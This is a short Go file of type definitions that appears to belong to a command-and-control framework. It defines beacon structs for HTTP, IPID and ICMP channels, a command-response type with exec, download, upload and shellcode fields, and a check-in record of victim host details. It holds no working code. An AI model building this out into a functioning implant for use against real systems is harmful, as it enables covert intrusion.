package main

type BeaconHttp struct {
	method string
	data []byte
	proxyClients []Beacon
}

type BeaconIPID struct {
	data []byte
	proxyClients []Beacon
}

type BeaconICMP struct {
	data []byte
	proxyClients []Beacon
}

type CommandResponse struct {
	Exec []string
	Download []string
	Upload []string
	Shellcode []string
	ProxyClients []string
}

type CommandUpdate struct {
	Ip string
	Id string
	User string
	Platform string
	Arch string
	Pid string
	Pname string
	Type string
	Data []byte
}
